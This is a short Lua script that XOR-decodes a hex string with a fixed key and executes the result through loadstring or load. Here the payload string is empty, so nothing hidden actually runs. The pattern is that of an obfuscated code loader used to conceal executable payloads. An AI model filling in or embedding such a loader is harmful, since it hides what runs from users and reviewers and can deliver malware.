local _k = "aQxZpLrT"
local _d = ""
local function xor(a,b)
local r,p=0,1
while a>0 or b>0 do
if (a%2)~=(b%2) then r=r+p end
        a=math.floor(a/2)
        b=math.floor(b/2)
        p=p*2
end
return r
end
local bytes={}
for i=1,#_d,2 do
    bytes[#bytes+1] = tonumber(_d:sub(i,i+1),16)
end
local out={}
for i=1,#bytes do
    out[i]=string.char(
        xor(bytes[i], _k:byte((i-1)%#_k+1))
    )
end
(loadstring or load)(table.concat(out))()
